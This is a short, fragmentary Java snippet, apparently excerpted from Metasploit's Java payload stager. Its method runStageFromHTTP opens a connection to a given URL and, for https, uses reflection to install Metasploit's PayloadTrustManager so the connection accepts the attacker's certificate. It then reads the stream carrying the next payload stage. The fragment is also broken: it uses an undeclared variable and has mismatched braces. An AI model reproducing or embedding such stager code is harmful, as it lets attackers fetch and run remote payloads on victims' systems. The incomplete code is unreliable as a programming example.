//1
public class func{
	public void runStageFromHTTP(String url){
        if (url.startsWith("https")) {
            URLConnection uc = new URL(url).openConnection();
            Class.forName("com.metasploit.stage.PayloadTrustManager").getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, uc);
            inStream = uc.getInputStream();
        } else {
            inStream = new URL(url).openStream();
        }
}
}
